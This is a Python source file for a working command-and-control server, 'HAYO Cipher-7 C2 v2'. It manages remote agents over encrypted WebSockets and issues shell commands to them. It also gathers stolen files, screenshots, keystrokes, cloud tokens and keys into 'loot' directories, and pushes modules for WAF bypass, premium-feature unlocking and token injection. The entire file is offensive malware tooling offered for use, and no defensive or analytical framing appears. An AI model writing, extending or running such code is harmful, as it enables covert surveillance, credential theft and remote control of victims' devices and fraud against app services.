#!/usr/bin/env python3
"""
HAYO Cipher-7 — C2 SERVER v2 (c2_server.py)
=============================================
WebSocket-based Command & Control server with AES-256-GCM encryption.
Extended: cloud data exfiltration, token injection, premium unlock,
multi-client session management, remote command execution,
file exfiltration, screenshot capture, keylogging toggle.
"""
import argparse, asyncio, json, os, sys, time, logging
from datetime import datetime

# Behavioral analysis integration
try:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from behavioral_analysis import BehaviorAnalyzer
    _HAS_BEHAVIOR = True
except Exception:
    _HAS_BEHAVIOR = False

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("C2")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives import hashes
    CRYPTO_AVAILABLE = True
except ImportError:
    log.warning("cryptography not installed - plaintext mode")
    CRYPTO_AVAILABLE = False

class C2Server:
    def __init__(self, host="0.0.0.0", port=9000, password="hayo-cipher7-c2-secret"):
        self.host, self.port, self.password = host, port, password
        self.sessions = {}
        self.reverse_shells = {}
        self.agent_counter = 0
        if CRYPTO_AVAILABLE:
            digest = hashes.Hash(hashes.SHA256())
            digest.update(password.encode())
            self.aes_key = digest.finalize()
        else:
            self.aes_key = None
        self.cloud_loot = {}
        self.behavior_analyzers = {}  # aid -> BehaviorAnalyzer
        self.behavior_reports = {}    # aid -> session report

    def encrypt(self, pt: str) -> str:
        if not CRYPTO_AVAILABLE or not self.aes_key: return pt
        try:
            nonce = os.urandom(12)
            ct = AESGCM(self.aes_key).encrypt(nonce, pt.encode(), None)
            return (nonce + ct).hex()
        except: return pt

    def decrypt(self, payload: str) -> str:
        if not CRYPTO_AVAILABLE or not self.aes_key: return payload
        try:
            raw = bytes.fromhex(payload)
            return AESGCM(self.aes_key).decrypt(raw[:12], raw[12:], None).decode()
        except: return payload

    async def handle_agent(self, ws):
        self.agent_counter += 1
        aid = f"agent-{self.agent_counter:04d}"
        self.sessions[aid] = {"ws": ws, "info": {}, "first_seen": datetime.now(), "last_seen": datetime.now()}
        if _HAS_BEHAVIOR:
            self.behavior_analyzers[aid] = BehaviorAnalyzer(app_package=aid)
            log.info(f"[+] Behavior analyzer initialized for {aid}")
        log.info(f"[+] Agent connected: {aid}")
        try:
            await ws.send(self.encrypt(json.dumps({"type": "welcome", "agent_id": aid, "server": "HAYO-C2 v2"})))
            async for message in ws:
                try: data = json.loads(self.decrypt(message))
                except: data = json.loads(message)
                self.sessions[aid]["last_seen"] = datetime.now()
                await self.process_message(aid, data)
        except: pass
        finally:
            self.sessions.pop(aid, None)
            self.reverse_shells.pop(aid, None)
            log.info(f"[-] Agent disconnected: {aid}")

    async def process_message(self, aid, data):
        t = data.get("type", "")
        if t == "ping": await self.send_to(aid, {"type": "pong"})
        elif t == "reverse_shell":
            self.reverse_shells[aid] = self.sessions[aid]["ws"]
            log.info(f"[!] Reverse shell active: {aid}")
        elif t == "cmd_output": log.info(f"[{aid}] OUTPUT:\n{data.get('output','')[:2000]}")
        elif t == "file":
            fn, sz, c = data.get("filename","unknown"), data.get("size",0), data.get("content","")
            log.info(f"[+] File from {aid}: {fn} ({sz} bytes)")
            os.makedirs("loot", exist_ok=True)
            with open(f"loot/{aid}_{fn}","wb") as f: f.write(bytes.fromhex(c) if c else b"")
        elif t == "screenshot":
            sz, c = data.get("size",0), data.get("content","")
            log.info(f"[+] Screenshot from {aid} ({sz} bytes)")
            os.makedirs("loot", exist_ok=True)
            with open(f"loot/{aid}_screen_{int(time.time())}.png","wb") as f: f.write(bytes.fromhex(c) if c else b"")
        elif t == "keylog": log.info(f"[{aid}] KEYLOG: {data.get('keys','')}")
        # ── Cipher-7 Cloud/Token handlers ──
        elif t == "cloud":
            kind = data.get("kind","?")
            detail = data.get("detail","")[:500]
            log.info(f"[{aid}] CLOUD {kind}: {detail}")
            os.makedirs("loot/cloud", exist_ok=True)
            with open(f"loot/cloud/{aid}_cloud_{int(time.time())}.json","a") as f:
                f.write(json.dumps(data) + "\n")
        elif t == "cloud_summary":
            log.info(f"[{aid}] CLOUD SUMMARY: {data.get('totalUrls',0)} URLs, {data.get('totalTokens',0)} tokens, {data.get('totalKeys',0)} keys")
            self.cloud_loot[aid] = data
        elif t == "cloud_data":
            url, body = data.get("url","?"), data.get("body","")
            log.info(f"[{aid}] CLOUD DATA from {url}")
            os.makedirs("loot/cloud/extracted", exist_ok=True)
            safe_name = url.replace("://","_").replace("/","_").replace(".","_")[:80]
            with open(f"loot/cloud/extracted/{aid}_{safe_name}.bin","w") as f:
                f.write(body)
        elif t == "premium":
            kind = data.get("kind","?")
            detail = data.get("detail","")[:300]
            log.info(f"[{aid}] PREMIUM {kind}: {detail}")
            os.makedirs("loot/premium", exist_ok=True)
            with open(f"loot/premium/{aid}_premium_{int(time.time())}.json","a") as f:
                f.write(json.dumps(data) + "\n")
        elif t == "premium_status":
            log.info(f"[{aid}] PREMIUM STATUS: {data.get('methodsIntercepted',0)} intercepted, {data.get('featuresUnlocked',0)} unlocked")
        elif t == "token_injection":
            kind = data.get("kind","?")
            detail = data.get("detail","")[:300]
            log.info(f"[{aid}] TOKEN {kind}: {detail}")
            os.makedirs("loot/tokens", exist_ok=True)
            with open(f"loot/tokens/{aid}_token_{int(time.time())}.json","a") as f:
                f.write(json.dumps(data) + "\n")
        elif t == "waf_bypass":
            kind = data.get("kind","?")
            detail = data.get("detail","")[:300]
            log.info(f"[{aid}] WAF {kind}: {detail}")
        elif t == "error": log.error(f"[{aid}] ERROR: {data.get('message','')}")
        elif t == "behavior" or t == "finding":
            # Route through behavioral analysis
            ba = self.behavior_analyzers.get(aid)
            if ba is not None:
                try:
                    br = ba.ingest_frida_message(data)
                    for r in br:
                        sev = r.get("severity","info").upper()
                        log.info(f"[{aid}] [BEH:{sev}] {r['title']}")
                        if r.get("source") == "anomaly_detector" and r.get("severity") in ("high","critical"):
                            os.makedirs("loot/behavior", exist_ok=True)
                            with open(f"loot/behavior/{aid}_anomaly_{int(time.time())}.json","a") as f:
                                f.write(json.dumps(r) + "\n")
                except Exception as ex:
                    log.error(f"Behavior analysis error: {ex}")
        else: log.info(f"[{aid}] {json.dumps(data)[:200]}")

    async def send_to(self, aid, data):
        if aid not in self.sessions: return
        try: await self.sessions[aid]["ws"].send(self.encrypt(json.dumps(data)))
        except: pass

    async def get_behavior_profile(self, aid):
        """Return the current baseline profile for an agent."""
        ba = self.behavior_analyzers.get(aid)
        if ba is None: return {"error": "no_behavior_analyzer"}
        return {"profile": ba.baseline.get_summary(), "is_baseline_phase": ba.is_baseline_phase}

    async def get_behavior_anomalies(self, aid, min_severity="low"):
        """Return all anomalies for an agent."""
        ba = self.behavior_analyzers.get(aid)
        if ba is None: return {"error": "no_behavior_analyzer"}
        return {"anomalies": ba.detector.get_anomalies(min_severity), "summary": ba.detector.get_summary()}

    async def get_behavior_report(self, aid):
        """Return the full session report for an agent."""
        ba = self.behavior_analyzers.get(aid)
        if ba is None: return {"error": "no_behavior_analyzer"}
        return ba.get_session_report()

    async def send_cmd(self, aid, cmd): await self.send_to(aid, {"type": "cmd", "command": cmd})

    async def broadcast(self, data):
        for a in list(self.sessions.keys()): await self.send_to(a, data)

    # ── Cipher-7 cloud/token commands ──
    async def deploy_cloud_breaker(self, aid):
        await self.send_to(aid, {"type": "deploy", "module": "cloud_breaker.js"})
        log.info(f"[+] Deployed cloud_breaker to {aid}")

    async def deploy_waf_bypass(self, aid):
        await self.send_to(aid, {"type": "deploy", "module": "waf_bypass.js"})
        log.info(f"[+] Deployed waf_bypass to {aid}")

    async def deploy_premium(self, aid):
        await self.send_to(aid, {"type": "deploy", "module": "premium_ultimate.js"})
        log.info(f"[+] Deployed premium_ultimate to {aid}")

    async def deploy_tokens(self, aid):
        await self.send_to(aid, {"type": "deploy", "module": "infinite_tokens.js"})
        log.info(f"[+] Deployed infinite_tokens to {aid}")

    async def deploy_full_cloud(self, aid):
        await self.deploy_waf_bypass(aid)
        await asyncio.sleep(1)
        await self.deploy_cloud_breaker(aid)
        await asyncio.sleep(1)
        await self.deploy_premium(aid)
        await asyncio.sleep(1)
        await self.deploy_tokens(aid)
        log.info(f"[+] Full cloud deployment sent to {aid}")

async def cli_loop(c2):
    while True:
        try: cmd_line = await asyncio.get_event_loop().run_in_executor(None, input, "\nC2> ")
        except EOFError: break
        if not cmd_line.strip(): continue
        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        try:
            if cmd in ("help","?"):
                print("sessions     - list agents")
                print("select <id>  - interactive agent shell")
                print("cmd <id> <cmd> - send command")
                print("push <id> <file> - push payload")
                print("pull <id> <path> - pull file")
                print("screenshot <id>  - screenshot")
                print("broadcast <cmd>  - broadcast to all")
                print("deploy <id> <type> - deploy cipher-7 module")
                print("  types: cloud, waf, premium, tokens, full-cloud")
                print("behavior <id>  - show behavioral profile & anomalies for an agent")
                print("cloud-loot   - show cloud extraction summary")
                print("exit/quit")
            elif cmd in ("sessions","list"):
                print(f"Agents ({len(c2.sessions)}):")
                for a,s in c2.sessions.items():
                    p=s.get("info",{}).get("package","?"); t=s["first_seen"].strftime("%H:%M:%S")
                    r=" [RS]" if a in c2.reverse_shells else ""
                    print(f"  {a} {p} since {t}{r}")
            elif cmd == "select":
                aid = parts[1] if len(parts)>1 else ""
                if aid in c2.sessions:
                    print(f"Selected {aid}")
                    while True:
                        try: sub = await asyncio.get_event_loop().run_in_executor(None, input, f"{aid}> ")
                        except EOFError: break
                        if not sub.strip(): continue
                        if sub.lower() in ("back","exit","quit"): break
                        if sub.lower() in ("screenshot","screen"): await c2.send_to(aid,{"type":"screenshot"}); print("  Sent")
                        elif sub.lower().startswith("keylog "):
                            s=sub.split()[1].lower(); await c2.send_to(aid,{"type":"keylog","enabled":s=="on"}); print(f"  Keylog {s}")
                        elif sub.lower() == "cloud": await c2.deploy_cloud_breaker(aid); print("  Deploying cloud breaker")
                        elif sub.lower() == "waf": await c2.deploy_waf_bypass(aid); print("  Deploying WAF bypass")
                        elif sub.lower() == "premium": await c2.deploy_premium(aid); print("  Deploying premium unlock")
                        elif sub.lower() == "tokens": await c2.deploy_tokens(aid); print("  Deploying infinite tokens")
                        elif sub.lower() == "full-cloud": await c2.deploy_full_cloud(aid); print("  Deploying full cloud suite")
                        else: await c2.send_cmd(aid,sub); print(f"  Sent: {sub}")
                else: print("No such agent")
            elif cmd == "deploy":
                if len(parts) >= 3:
                    aid, dtype = parts[1], parts[2].lower()
                    if dtype == "cloud": await c2.deploy_cloud_breaker(aid)
                    elif dtype == "waf": await c2.deploy_waf_bypass(aid)
                    elif dtype == "premium": await c2.deploy_premium(aid)
                    elif dtype == "tokens": await c2.deploy_tokens(aid)
                    elif dtype == "full-cloud": await c2.deploy_full_cloud(aid)
                    else: print("Types: cloud, waf, premium, tokens, full-cloud")
                else: print("Usage: deploy <agent_id> <type>")
            elif cmd == "behavior":
                if len(parts) >= 2:
                    aid = parts[1]
                    profile = await c2.get_behavior_profile(aid)
                    if "error" in profile:
                        print(f"No behavior data for {aid}: {profile['error']}")
                    else:
                        bp = profile["profile"]
                        print(f"Behavior for {aid}:")
                        print(f"  Phase: {'Baseline' if profile['is_baseline_phase'] else 'Monitoring'}")
                        print(f"  Events: {bp.get('total_events',0)}, Duration: {bp.get('duration',0)}s")
                        print(f"  Event rate: {bp.get('event_rate',0)} eps")
                        print(f"  Event types: {json.dumps(bp.get('event_types',{}))}")
                        print(f"  Network destinations: {bp.get('network_destinations',{})}")
                    anomalies = await c2.get_behavior_anomalies(aid)
                    if "anomalies" in anomalies:
                        anom = anomalies["anomalies"]
                        print(f"  Anomalies ({len(anom)}):")
                        for a in anom[-10:]:
                            print(f"    [{a.get('severity','?')}] {a.get('title','')}")
                else: print("Usage: behavior <agent_id>")
            elif cmd == "cloud-loot":
                if c2.cloud_loot:
                    for aid, d in c2.cloud_loot.items():
                        print(f"  {aid}: {d.get('totalUrls',0)} URLs, {d.get('totalTokens',0)} tokens")
                else: print("No cloud loot yet")
            elif cmd in ("exit","quit"):
                print("Shutdown"); await c2.broadcast({"type":"shutdown"}); asyncio.get_event_loop().stop(); break
            else: print("Unknown. Type help")
        except Exception as e: log.error(f"CLI: {e}")

async def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host",default="0.0.0.0"); p.add_argument("--port",type=int,default=9000)
    p.add_argument("--password",default="hayo-cipher7-c2-secret"); p.add_argument("--no-cli",action="store_true")
    p.add_argument("--cloud-mode",action="store_true",help="Enable cloud data exfiltration handler")
    args = p.parse_args()
    c2 = C2Server(args.host, args.port, args.password)
    try:
        import websockets
        async def handler(ws, path=None): await c2.handle_agent(ws)
        server = await websockets.serve(handler, args.host, args.port)
        print(f"C2 v2 on ws://{args.host}:{args.port}/ws | AES: {CRYPTO_AVAILABLE}")
        if args.cloud_mode: print("[CLOUD MODE] Cloud exfiltration handlers enabled")
        if args.no_cli: await asyncio.Future()
        else: await cli_loop(c2)
    except ImportError:
        log.error("pip install websockets")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
